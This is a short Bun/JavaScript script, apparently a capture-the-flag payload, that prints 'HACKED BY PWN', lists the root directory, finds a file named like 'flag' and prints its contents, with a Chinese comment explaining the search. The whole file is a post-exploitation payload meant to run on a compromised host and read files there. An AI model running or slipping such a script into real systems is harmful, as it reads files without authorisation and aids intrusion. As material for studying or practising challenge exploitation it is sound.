#!/usr/bin/env bun
const fs = require('fs');

console.log("=== HACKED BY PWN ===");
try {
    // 列出根目錄檔案，找出 flag 確切檔名
    const files = fs.readdirSync('/');
    const flagFile = files.find(f => f.includes('flag'));
    
    if (flagFile) {
        console.log("[*] Found Flag File: " + flagFile);
        console.log(fs.readFileSync('/' + flagFile, 'utf8'));
    } else {
        console.log("[-] No flag file found!");
        console.log("Root files:", files.join(', '));
    }
} catch (e) {
    console.log("Error:", e.toString());
}
